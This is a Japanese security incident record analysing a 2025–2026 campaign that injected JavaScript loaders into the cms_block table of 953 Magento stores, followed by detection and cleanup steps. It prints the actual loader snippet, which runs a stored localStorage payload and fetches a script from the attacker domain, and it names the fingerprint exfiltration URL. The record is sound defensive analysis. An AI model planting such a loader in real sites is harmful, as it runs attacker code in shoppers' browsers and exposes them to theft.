INC-2026-0703Magento 953店舗にローダー常駐

**Magento を中心に953店舗へ JavaScript のローダーが仕込まれ続けている。** EC セキュリティ企業 Sansec が2026年10月24日に公表した追跡で、 同一の攻撃者が2025年7月から15か月にわたり**5つのローダードメインを数か月ごとに 乗り換えながら**、店舗の `cms_block` テーブル（Magento が店頭ページへ描画する 静的ブロック）にスクリプトを書き込んでいた。 最新の `deepveindrilling.com` は83店舗で見つかり、**うち60店舗は以前の ローダーを既に走らせていた常習の被害者**である。 **最も重い指摘は「パッチ済みの店舗にも入る」こと**—— Magento 2.4.7-p10・コアパッチの欠けが無い店舗が、 **清浄と判定されたスキャンの1時間後**（2026年10月23日16:46 UTC）に ローダーを読み込んだ。その店舗では9月16日に不正な管理者アカウント、 9月24日に GSocket バックドアが見つかっていた。 **侵入経路は Magento のファイルアップロードの不備** （PolyShell／CVE-2026-48356・SessionReaper／CVE-2025-54236）で、 2026年3月30日には1時間で471店舗へ一斉に仕込まれている。 10月23日版のローダーは**訪問者のブラウザを指紋採取して自動化ブラウザをふるい分け**、 スキャナには何も返さない。**最終ペイロードは Sansec もまだ捕まえていない。**

脅威・攻撃キャンペーン不正アクセス・侵害続報が続いている有名事象として記録（日本と直接の関係は薄い）既知の脆弱性の悪用脆弱性の放置権限管理の不備
初報: 2026年10月24日（Sansec の公表日） 最終更新: 2026年10月27日（本記録の作成時点）

EC セキュリティ企業 Sansec は2026年10月24日、オンライン店舗に JavaScript のローダーを仕込み続けている攻撃者の追跡結果を公表しました。2025年7月以降、953店舗（ほとんどが Magento）が被害を受けており、攻撃者は数か月ごとにローダーのドメインを乗り換えています（出典1）。

仕込まれる場所は Magento の cms_block テーブルです（店頭ページへ描画される静的ブロック）。eComscan はキャンペーン全体で148のサーバインストールでここにローダーを見つけており、core_config_data やテーマファイルでは一度も見つかっていません（出典1）。

本記録が最も重いと判断したのは、「パッチ済みでも入る」という一節です。

「パッチ済みの店舗にもローダーは入る。Magento 2.4.7-p10 でコアパッチの欠けが無い1店舗が、清浄だったスキャンの1時間後、2026年10月23日16:46 UTC にdeepveindrilling.com を読み込んだ。eComscan はその店舗で、9月16日に不正な管理者アカウント、9月24日に GSocket バックドアを見つけていた」（出典1。原文英語。訳は本記録）

パッチは侵入の入口を閉じますが、既に置かれた管理者アカウントとバックドアは閉じません（本記録の評価）。

最新のローダー（2026年10月23日版）は、訪問者のブラウザを指紋採取して自動化ブラウザをふるい分け、スキャナには何も返しません（出典1）。urlscan.io が自動化 Chrome で感染店舗を読み込んだときは HTTP 200 が返り、ページに追加された内容は見つかりませんでした（出典1）。最終ペイロードは Sansec もまだ捕まえていません〈未確定2〉。

攻撃の経過

公表された範囲の事実のみ。公表されていない段階は補完せず明示しています。

**攻撃の形は「脆弱性で入る → 権限と裏口を残す → データベースのブロックに スクリプトを書く → 訪問者のブラウザで実行させる」である**（出典1。段階への割り当ては本記録）。 **パッチは1段目にしか効かない**（本記録の評価）—— **2段目が残っていれば、3段目は何度でも繰り返せる。**

  1. 1. 初期侵入確認済
    **ファイルアップロードの不備でウェブシェルを置く**（出典1）。 **ある店舗（Magento 2.4.7-p1）では、PolyShell のウェブシェルが PNG 画像を装って `pub/media/custom_options/quote/` に置かれていた**（出典1）。
    根拠: **「3月、オペレータは PolyShell 経由でウェブシェルをアップロードしたうえで、 1時間に471店舗へローダーを注入した」**（出典1。原文英語。訳は本記録）。
  2. 2. 永続化確認済
    **不正な管理者アカウントとバックドア（GSocket）を残す**（出典1）。 **パッチ済みで感染した店舗では、9月16日に管理者アカウント、 9月24日に GSocket バックドアが見つかっていた**（出典1）。
    根拠: **「パッチ済みの店舗にもローダーは入る。……eComscan はその店舗で 9月16日に不正な管理者アカウント、9月24日に GSocket バックドアを 見つけていた」**（出典1。原文英語。訳は本記録）。
  3. 3. 実行確認済
    **`cms_block` テーブルの `content` にローダーのスクリプトを書き込む**（出典1）。 **2026年10月23日には既存のブロックを書き換えて指紋採取版に差し替えており、 再クロールした71店舗すべてが新版になっていた**（出典1）。
    根拠: **「eComscan はキャンペーンを通じて148のサーバインストールの `cms_block` でローダーを見つけ、`core_config_data` やテーマファイルでは 一度も見つけていない」**（出典1。原文英語。訳は本記録）。
  4. 4. 検知回避確認済
    **訪問者のブラウザを指紋採取し、自動化ブラウザには何も返さない**（出典1）。 **ドメインの front page は404を返し、感染店舗の訪問者からの スクリプト要求にしか応答しない**（出典1）。 **Cloudflare の背後に置かれている**（出典1）。
    根拠: **「urlscan.io が自動化 Chrome で感染店舗を読み込んだとき、HTTP 200 が返り、 Sansec はページに追加された内容を見つけられなかった」** （出典1。原文英語。訳は本記録）。
  5. 5. 影響（暗号化・破壊・改ざん）確認済
    **訪問者のブラウザでペイロードを実行する**（出典1）。 **`localStorage` の `fpCode` に保存されるため、 一度受け取った訪問者はドメインが止まっても実行し続ける**（出典1）。 **2025年12月12日には、Ledger の綴り違いのドメインを含む 暗号資産系サイトのスクリプトが実際の顧客へ配信された**（出典1）。
    根拠: **「一度ペイロードを受け取った訪問者は、 ドメインが止まっていても遮断されていても、 以後のページ表示のたびにそれを実行する」**（出典1。原文英語。訳は本記録）。

パッチを当てても、先に置かれた管理者アカウントは閉じない原因・手口

Sansec の報告でもっとも重いのは、次の一節である（出典1）。

「パッチ済みの店舗にもローダーは入る。Magento 2.4.7-p10 でコアパッチの欠けが無い1店舗が、清浄だったスキャンの1時間後、2026年10月23日16:46 UTC に deepveindrilling.com を読み込んだ。eComscan はその店舗で、9月16日に不正な管理者アカウント、9月24日に GSocket バックドアを見つけていた」（出典1。原文英語。訳は本記録）

時間の並びを読むと、この店舗で起きたことは「検知の失敗」ではない（本記録の評価）。

日付 出来事
2026年9月16日 不正な管理者アカウントを検出（出典1）
2026年9月24日 GSocket バックドアを検出（出典1）
2026年10月23日 15:46 頃 スキャンが清浄と判定（出典1）
2026年10月23日 16:46 UTC ローダーが書き込まれる（出典1）

検出はできていた。 残っていたのは、検出したものを無効化する作業である（本記録の評価）。そして「コアパッチの欠けが無い」という状態は、その作業の完了を意味しない。

脆弱性管理の指標（パッチ適用率・既知脆弱性の残数）は、この店舗を「対応済み」と数える（本記録の評価）。実際には、攻撃者の正規アカウントが生きたまま残っていた。

改ざんはファイルではなくデータベースの中にあり、外から見ると清浄に見える原因・手口

仕込み先は Magento の cms_block テーブルである（出典1）。eComscan はキャンペーン全体で148のサーバインストールでここに見つけ、core_config_data やテーマファイルでは一度も見つけていない（出典1）。

この置き場所の選択が、2つの検知手段を同時に外している（本記録の評価）。

  1. ファイルの完全性チェックに映らない。 ファイルは変わらない。
  2. 外部からの取得に映らない。 10月23日版のローダーは訪問者のブラウザを指紋採取し、自動化ブラウザには何も返さない（出典1）。

2点目は実測されている。

「urlscan.io が自動化 Chrome で感染店舗を読み込んだとき、HTTP 200 が返り、Sansec はページに追加された内容を見つけられなかった」（出典1。原文英語。訳は本記録）

つまり「サイトを外からスキャンして清浄」という報告は、本件については何も言っていない（本記録の評価）。残る手段は2つに絞られる——サーバ側（データベースの中身）を見ることと、実際の訪問者のブラウザから報告を受け取ることである。

後者が CSP（Content-Security-Policy）の違反報告であり、Sansec Watch は additionalver.com について約52,000件の報告を受けている（出典1）。訪問者のブラウザだけが見ている事実を、店舗側へ戻す経路である（本記録の整理）。

スクリプトを消しても、訪問者の端末では動き続ける再発防止

10月初版のローダーは、2つのスクリプトに分かれている（出典1）。

<script>!function(){try{var c=localStorage.getItem("fpCode");
if(c){var e=document.createElement("div");e.setAttribute("onclick",c);
document.documentElement.appendChild(e);e.click();e.remove()}}catch(e){}}();</script>
<script src="https://deepveindrilling.com/?s=d35c5031"></script>

1つ目は訪問者の localStorage から fpCode を読み、値があれば不可視の div の onclick 属性に入れてクリックする（出典1）。ブラウザがイベントハンドラとして実行するので eval() を通らない（出典1）。

結果として、ペイロードは訪問者の端末に残る。

「一度ペイロードを受け取った訪問者は、ドメインが止まっていても遮断されていても、以後のページ表示のたびにそれを実行する」（出典1。原文英語。訳は本記録）

2026年3月版は一度実行すると保存した値を消していた（出典1）。10月版は消さない——つまり作り手は、意図してこの挙動に変えている（本記録の評価）。

店舗側の復旧に関して、出典1 は2点を明示している（出典1）。

  • スクリプトを消しても、攻撃者のデータベースへの書き込み権限は残る。
  • 削除後は、店舗側で fpCode を読むものは無くなる（＝新しい訪問者には配られなくなる）。

既にペイロードを受け取った訪問者の端末は、店舗側の清掃では戻らない（出典1 の記述に基づく本記録の整理）〈未確定2〉——その人数は公表されていない。

見落としやすいのは、最初の2つが失効し、2026年5月に再登録されてドメインパーキング業者のネームサーバを使っているという点である（出典1）。それでも——

掃除されなかった店舗は、攻撃者が去ったあとも、ドメインを買った誰かに訪問者を引き渡し続ける（本記録の評価）。これは本件固有の話ではない——外部ドメインを読み込むコードが自社サイトに残っている限り、そのドメインの所有者が変わった時点でリスクの持ち主も変わる（本記録の評価。[[INC-2026-0171]] の形に近い）。

事案の詳細

injection_point**Magento の `cms_block` テーブルの `content` 列**（出典1） ——**店頭ページへ描画される静的ブロックである。** **eComscan はキャンペーン全体で148のサーバインストールでここに見つけており、 `core_config_data` やテーマファイルでは一度も見つかっていない**（出典1）。 **`cms_page` も同じ方法で確認すべき対象として挙げられている**（出典1）。
loader_behavior**10月初版は2つのスクリプトからなる**（出典1）。 **①訪問者の `localStorage` から `fpCode` を読み、値があれば不可視の `div` の `onclick` 属性に入れてクリックする**——**ブラウザがイベントハンドラとして実行するため `eval()` を通らない**（出典1）。 **②`deepveindrilling.com/?s=d35c5031` を読み込む。** **ブロックの中に `fpCode` を書く処理は無いので、値を書くのはローダー側である**（出典1）。 **一度ペイロードを受け取った訪問者は、以後ドメインが止まっても遮断されても、 ページを見るたびに同じコードを実行し続ける**（出典1）〈重要〉 ——**2026年3月版は一度実行すると保存した値を消していた**（出典1）。
fingerprinting**2026年10月23日版は、素のスクリプトタグをインラインのローダーに置き換え、 `https://deepveindrilling.com/?s=49b7ca5f&fp=` へブラウザの指紋を送る**（出典1）。 **自動化ブラウザの判定に `navigator.webdriver`・Selenium のグローバル変数・ ChromeDriver の `cdc_` プロパティを使い、 さらに WebGL の GPU 名・CPU コア数・メモリ・画面サイズ・タイムゾーン・ 言語・クライアントヒントを集める**（出典1）。 **サーバは指紋に応じて応答を選ぶ**（出典1）。
緩和策
手順: **`cms_block` と `cms_page` の `content` を `%fpCode%`・`%se_referrer%`・`%localStorage.getItem%` で検索する** （出典1）。**ドメインは base64 で符号化されていることが多いため、 ドメイン名ではなくコードの型で探す**（出典1）。 **テーブル接頭辞を使っている場合は付ける**（出典1）。　副作用: **`update_time` で攻撃者の最後の書き込み時刻が分かる**（出典1） ——**この値は調査の起点になるため、削除の前に記録しておくこと**（本記録の注意）。
手順: **侵入に使われた不備・バックドアを探す**—— `pub/media/custom_options/`・`pub/media/customer_address/` の `.htaccess` 以外のファイル、`accesson.php`、 `admin_user` の見覚えのないアカウント、不審なプロセス（出典1）。　副作用: **スクリプトを消しただけでは攻撃者のデータベースへの書き込み権限は残る** （出典1）〈重要〉——**「消して終わり」にすると数日で元に戻る**（本記録の評価）。
手順: **清掃後にデータベース・管理画面・API 連携のパスワードを変更し、 APSB26-73（PolyShell）と APSB25-88（SessionReaper）を適用する**（出典1）。　副作用: **パスワードの一斉変更は API 連携の停止を招きうる**（本記録の評価） ——**連携先の一覧を先に作ってから実施すること。** **なお本件は「パッチだけでは足りない」事例であり、 パッチの適用をもって完了としないこと**（本記録の明示）。
悪用の有無状況: 確認されていない　時点: 2026年10月27日　根拠: **Sansec の観測（eComscan・自前クローラ・Sansec Watch）に基づく**（出典1）。　補足: **「最終ペイロードを捕まえていない」ため、 訪問者に何が起きたかは確認されていない**（出典1）。 **「被害が無かったことが確認された」ではない**（本記録の明示） ——**2025年12月には実際の訪問者への配信記録があり**（出典1）、 **一度ペイロードを受けた訪問者はその後も実行し続ける**（出典1）。　出典: 1
ログの有無**店舗側に残るのは `cms_block.content` の `update_time`（攻撃者の最後の書き込み時刻） である**（出典1）。 **訪問者側で何が実行されたかの記録は、CSP 違反報告を集めていない店舗には残らない** （本記録の評価）——**Sansec Watch が約52,000件の報告を受けられたのは、 監視を入れていた店舗があったからである**（出典1）。

CISO・経営層への示唆
  • 「パッチ適用率」は、侵害後の店舗の状態を表さない。完了条件に権限の棚卸しを入れる。
    **コアパッチの欠けが無い Magento 2.4.7-p10 の店舗が、 清浄判定の1時間後にローダーを読み込んだ**（出典1）。 **その店舗では1か月前に不正な管理者アカウントとバックドアが 検出されていた**（出典1）。 **脆弱性管理の指標はこの店舗を「対応済み」と数える**（本記録の評価）。
    取るべき行動 **侵害が疑われた資産について、「パッチ適用」と「権限・裏口の無効化」を 別の完了条件として管理する。** **後者の完了は、管理者アカウント一覧・API 連携の鍵・常駐プロセスの 3点を人が確認した記録をもって判定する**（出典1 の確認手順に基づく）。
  • 外部からのスキャン結果を「清浄の証拠」として受け取らない。
    **10月23日版のローダーは自動化ブラウザをふるい分け、 urlscan.io の自動化 Chrome には追加内容を返さなかった**（出典1）。 **外からページを取得する検査では、原理的に見えない**（本記録の評価）。
    取るべき行動 **委託先・自社のサイト健全性チェックが「外からの取得」だけで 成り立っていないかを確認する。** **サーバ側（データベースの内容）と訪問者側（CSP 違反報告）の 2方向を足す**（出典1 の手段に基づく）。
  • EC サイトの改ざんは、自社の損失ではなく顧客の損失として現れる。
    **ローダーが動くのは訪問者のブラウザである**（出典1）。 **2025年12月12日には、感染店舗にログインした顧客へ Ledger を模したドメインのスクリプトが配信された**（出典1）。 **一度受け取った訪問者は、店舗を掃除しても実行を続ける**（出典1）。
    取るべき行動 **改ざんが見つかったときの対応手順に「訪問者への告知」を明記する。** **本件の形では、ブラウザのデータ（`localStorage`）を消すまで 訪問者側の実行が止まらない**（出典1 の記述に基づく本記録の整理） ——**告知の内容に、その操作を含める必要がある。**
  • 自社サイトが読み込んでいる外部ドメインの一覧を、資産として持つ。
    **失効して2026年5月に再登録された2ドメインのローダーが、 2026年8月〜10月にもなお9店舗・6店舗で動いていた**（出典1）。 **訪問者はリファラとページタイトルを新しい所有者へ送り、 返ってきた任意のスクリプトを実行する**（出典1）。
    取るべき行動 **自社サイトが読み込む外部ドメインを棚卸しし、 「意図して読み込んでいるもの」の一覧（許可リスト）を作る。** **一覧に無いドメインの読み込みを CSP の報告で検出できる状態にする。**
セキュリティ技術者への示唆
  • 改ざんの探索対象に `cms_block` / `cms_page` を入れる。ファイルだけでは見えない。
    **eComscan は148のサーバインストールの `cms_block` でローダーを見つけ、 `core_config_data` やテーマファイルでは一度も見つけていない**（出典1）。 **ファイルは変わらないので、完全性チェックには映らない**（本記録の評価）。
    取るべき行動 **次の検索を定期実行する**（出典1 の手順。テーブル接頭辞があれば付ける）。 `SELECT block_id, identifier, update_time FROM cms_block WHERE content LIKE '%fpCode%' OR content LIKE '%se_referrer%' OR content LIKE '%localStorage.getItem%';` **同じ検索を `cms_page` にも行う。** **ドメイン名ではなくコードの型で探す**——**ドメインは base64 で 符号化されていることが多い**（出典1）。
  • ファイルアップロードの置き場に、ファイルが増えていないかを見る。
    **PolyShell のウェブシェルは PNG 画像を装って `pub/media/custom_options/quote/` に置かれていた**（出典1）。 **ローダーを持つ Magento 2 の169インストールのうち102件（60%）に PolyShell か SessionReaper 経由のアップロードファイルがあった**（出典1）。
    取るべき行動 **`find pub/media/custom_options/ pub/media/customer_address/ -type f ! -name '.htaccess'` と `find . -name 'accesson.php' -type f` を定期実行し、 結果が空でないことを異常として扱う**（出典1 の手順）。 **拡張子ではなく「そこにファイルがあること」を異常とする**（本記録の整理）。
  • CSP の違反報告を受け取る口を作る。訪問者側しか見ていない事実が届く。
    **Sansec Watch は `additionalver.com` の読み込みについて 約52,000件の報告を受けている**（出典1）。 **店舗側のログには、訪問者のブラウザが何を読み込んだかは残らない** （本記録の評価）。
    取るべき行動 **`Content-Security-Policy-Report-Only` と `report-uri`/`report-to` を設定し、 自社サイトから出る外部ドメインの読み込みを集計する。** **遮断は後でよい——まず見えるようにする**（本記録の整理）。
  • 清掃の完了条件に、データベース・管理画面・API 連携の資格情報の変更を含める。
    **「スクリプトを消しても、攻撃者のデータベースへの書き込み権限は残る」** （出典1。原文英語。訳は本記録）。 **残っていれば、同じ書き込みが繰り返される**（本記録の評価）。
    取るべき行動 **①`cms_block.update_time` を記録 → ②スクリプトを削除 → ③アップロード経路とバックドアの探索 → ④`admin_user` の精査 → ⑤データベース・管理画面・API 連携のパスワード変更 → ⑥APSB26-73 / APSB25-88 の適用、の順で行う**（出典1 の手順。整理は本記録）。 **①を飛ばすと、攻撃者の最後の書き込み時刻という調査の起点を失う。**

自組織に当てはまるか

該当する項目があれば、この事案と同じ構図が自組織でも成立しうることを意味します。
観点自社に当てはまるか該当する場合に何が起きうるか
システム構成□ Magento / Adobe Commerce で店頭を運営しており、 CMS ブロック（`cms_block`）や CMS ページを使っている
